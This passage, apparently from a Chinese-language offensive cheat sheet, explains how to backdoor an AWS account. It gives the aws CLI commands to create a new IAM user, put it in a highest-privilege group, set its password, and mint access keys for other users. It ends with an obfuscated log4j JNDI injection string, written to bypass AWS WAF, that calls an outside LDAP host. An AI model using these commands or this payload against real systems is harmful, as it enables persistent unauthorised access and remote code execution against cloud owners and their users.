  #### 新用户
	对云环境进行后门的最简单方法之一是创建一个对该环境具有完全访问权限的新用户。 使用“aws iam create-user --user-name MyUser”命令创建新用户。
	一旦你创建了这个用户，你应该把他们放在一个拥有最高权限的组中。 要将用户添加到组中，您可以使用以下命令：
	> aws iam add-user-to-group --user-name MyUser --group-name MyIamGroup
	最后使用以下命令为用户添加密码：
	> aws iam create-login-profile --user-name MyUser --password password@123.
  #### 访问密钥
	如果用户更改了密码，您将无法再访问该用户。
	但是，用户拥有的任何访问密钥仍然有效。 如果您拥有正确的权限，则可以通过为其他用户创建和下载访问密钥来后门。 这可以通过以下命令完成。
	> aws iam create-access-key --user-name MyUser
	现在您有了访问密钥，您可以将其与 AWS cli 一起使用，以该用户身份与云环境进行交互。
  ### 绕过AWS WAF进行log4j jndi注入
	${j${k8s:k5:-ND}i${sd:k5:-:}ldap://mydogsbutt.com:1389/o}